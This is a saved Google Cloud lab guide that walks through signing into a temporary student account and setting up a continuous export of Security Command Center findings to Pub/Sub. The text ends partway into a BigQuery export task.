account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-19'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-e33c941009e3@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">VRkOon286rTg</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-11'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-04-0f5774f16b5e</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-04-0f5774f16b5e</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-e33c941009e3@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-04-0f5774f16b5e</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h2 id='scenario-3'><span>Scenario</span></h2><p><img src="images\qO2i8mve9e0jOrBbEsDzPFfEkM1ea6S0a7mXdN%2FNS%2BA%3D" referrerpolicy="no-referrer" alt="5ce916afc496a60c.jpeg"></p><p>&nbsp;</p><p><span>Cymbal Bank is an American retail bank with over 2,000 branches in all 50 states. It offers comprehensive debit and credit services that are built on top of a robust payments platform. Cymbal Bank is a digitally transforming legacy financial services institution.</span></p><p><span>Cymbal Bank was founded in 1920 under the name Troxler. Cymbal Group acquired the company in 1975 after it had been investing heavily in Cymbal Group&#39;s proprietary ATMs. As the bank grew into a national leader, they put strategic emphasis on modernizing the customer experience both in-person at their branches and digitally through an app they released in 2014. Cymbal Bank employs 42,000 people nationwide and, in 2019, reported $24 billion in revenue.</span></p><p><span>Cymbal Bank is interested in integrating a centralized security monitoring platform to help monitor threats and remediate vulnerabilities across their Google Cloud resources in their corporate banking applications. As a Cloud Security Engineer, you are tasked with learning about Security Command Center&#39;s export and analytics features so you can deliver a presentation to the CTO on the services&#39; benefits.</span></p><h2 id='task-1-create-a-continuous-export-pipeline-to-pubsub'><span>Task 1. Create a continuous export pipeline to Pub/Sub</span></h2><p><span>Security Command Center can export security findings to external resources using several methods, including the following:</span></p><ul><li><p><span>Continuous exports to a BigQuery dataset.</span></p></li><li><p><span>Continuous exports to Pub/Sub.</span></p></li><li><p><span>One-time exports to CSV files.</span></p></li><li><p><span>One-time exports to Cloud Storage buckets as JSON files.</span></p></li></ul><p><span>In this task, you explore how to configure continuous exports of findings to Pub/Sub.</span></p><p><strong><span>Note:</span></strong><span> Continuous exports of findings work only for newly created findings.</span></p><p><span>Continuous exports to Pub/Sub are typically used for forwarding findings to external security management systems such as Splunk or QRadar.</span></p><p><span>For the purposes of this lab, you export your findings to a Pub/Sub topic and then simulate an application by fetching the messages from a Pub/Sub subscription.</span></p><p><strong><span>Note:</span></strong><span> You can check the documentation page to explore more about </span><a href='https://cloud.google.com/pubsub/docs/overview'><span>What is Pub/Sub?</span></a></p><h3 id='create-a-pubsub-topic-and-subscription'><span>Create a Pub/Sub topic and subscription</span></h3><p><span>Before you can start configuring an SCC export, you first need to create a Pub/Sub topic and subscription.</span></p><ol start='' ><li><p><span>On the Google Cloud console title bar, type </span><code>Pub/Sub</code><span> in the search field and press </span><strong><span>Enter</span></strong><span>. Then click on the uppermost search result, </span><strong><span>Pub/Sub</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Create Topic</span></strong><span> button on the </span><strong><span>Topics</span></strong><span> page.</span></p></li><li><p><span>Enter in </span><code>export-findings-pubsub-topic</code><span> for the Topic ID.</span></p></li><li><p><span>Leave all other settings as their defaults and click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>This automatically kicks off the creation process for both a Pub/Sub topic and an associated subscription.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Subscriptions</span></strong><span> in the left-hand menu.</span></p></li><li><p><span>Click on </span><strong><span>export-findings-pubsub-topic-sub</span></strong><span>. If you don&#39;t see the subscription listed, refresh the browser page.</span></p></li></ol><p><span>This provides you with a dashboard of statistics and metrics related to the messages published in this subscription.</span></p><h3 id='create-a-continuous-export-of-findings'><span>Create a continuous export of findings</span></h3><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Security &gt; Risk Overview</span></strong><span> and then click </span><strong><span>Settings</span></strong><span> at the top of the page.</span></p></li><li><p><span>Click on the </span><strong><span>Continuous Exports</span></strong><span> tab.</span></p></li><li><p><span>Click the </span><strong><span>Create Pub/Sub Export</span></strong><span> button.</span></p></li><li><p><span>For the </span><strong><span>Continuous export name</span></strong><span>, enter in </span><code>export-findings-pubsub</code><span>.</span></p></li><li><p><span>For the </span><strong><span>Continuous export description</span></strong><span>, enter in </span><code>Continuous exports of Findings to Pub/Sub and BigQuery</code><span>.</span></p></li><li><p><span>For the </span><strong><span>Project name</span></strong><span>, select </span><strong><code>qwiklabs-gcp-04-0f5774f16b5e</code></strong><span>, which is the project ID of the project you are working in. (</span><em><span>Do not</span></em><span> select Qwiklabs Resources).</span></p></li><li><p><span>In the </span><strong><span>Select a Cloud Pub/Sub topic</span></strong><span> field, select the </span><strong><span>projects/</span><code>qwiklabs-gcp-04-0f5774f16b5e</code><span>/topics/export-findings-pubsub-topic</span></strong><span>.</span></p></li><li><p><span>Set the findings query to the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">state="ACTIVE"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">AND NOT mute="MUTED"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This query ensures that all new </span><code>ACTIVE</code><span> and </span><code>NOT MUTED</code><span> findings are forwarded to the newly created Pub/Sub topic.</span></p><p><strong><span>Note:</span></strong><span> You might see the message that there are several findings matched. Remember that existing findings are </span><strong><span>not</span></strong><span> forwarded to the Pub/Sub topic.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><span>You have now created a continuous export from Security Command Center to Pub/Sub.</span></p><h3 id='create-new-findings-to-export-to-pubsub'><span>Create new findings to export to Pub/Sub</span></h3><p><span>In this section, you create new findings and check how they are exported to Pub/Sub.</span></p><ol start='' ><li><p><span>Open a new Cloud Shell session (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>).</span></p></li><li><p><span>Run the following command to create a new virtual machine:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create instance-1 --zone=europe-west4-a \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--scopes=https://www.googleapis.com/auth/cloud-platform</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Ensure you receive an output similar to the following.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: instance-1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: us-central-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.128.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 34.69.82.225</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> If you get an error message that says </span><code>ERROR: (gcloud.compute.instances.create) You do not currently have an active account selected</code><span>, re-run the command again.</span></p><p><span>This command creates a new VM instance with a public IP address and a default service account attached.</span></p><p><span>Performing this activity immediately generates three new vulnerability findings:</span></p><ul><li><p><span>Public IP address</span></p></li><li><p><span>Default service account used</span></p></li><li><p><span>Compute secure boot disabled</span></p></li></ul><ol start='' ><li><p><span>On the Google Cloud console title bar, type </span><code>Pub/Sub</code><span> in the search field and press </span><strong><span>Enter</span></strong><span>. Then click on the uppermost search result, </span><strong><span>Pub/Sub</span></strong><span>. Then click </span><strong><span>Subscriptions</span></strong><span> in the left-hand menu.</span></p></li><li><p><span>Select the </span><strong><span>export-findings-pubsub-topic-sub</span></strong><span> subscription.</span></p></li><li><p><span>Click the </span><strong><span>Messages</span></strong><span> tab.</span></p></li><li><p><span>Select the </span><strong><span>Enable ack messages</span></strong><span> checkbox.</span></p></li><li><p><span>Click the </span><strong><span>Pull</span></strong><span> button.</span></p></li></ol><p><span>You should receive a list of messages in this subscription. These relate to the public IP address, default service account used, and compute secure boot disabled vulnerabilities.</span></p><p><strong><span>Note:</span></strong><span> You can click the </span><strong><span>Column display options</span></strong><span> button in the Messages list to modify which message details display, such including the </span><strong><span>body.finding.category</span></strong><span> for more detail.</span></p><p><span>By pulling the messages from the Pub/Sub subscription, you have simulated the behavior of an application that can forward these messages to another security monitoring system such as Splunk.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a continuous export pipeline to Pub/Sub</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-export-and-analyze-scc-findings-with-bigquery'><span>Task 2. Export and analyze SCC findings with BigQuery</span></h2><p><span>SCC findings can also be exported to a BigQuery dataset. This might be useful for building analytical dashboards that you can use to check what type of findings appear in your organization most often.</span></p><p><span>As of now, configuring continuous exports can only be set using commands (i.e. not in the console).</span></p><ol start='' ><li><p><span>Open a Cloud Shell 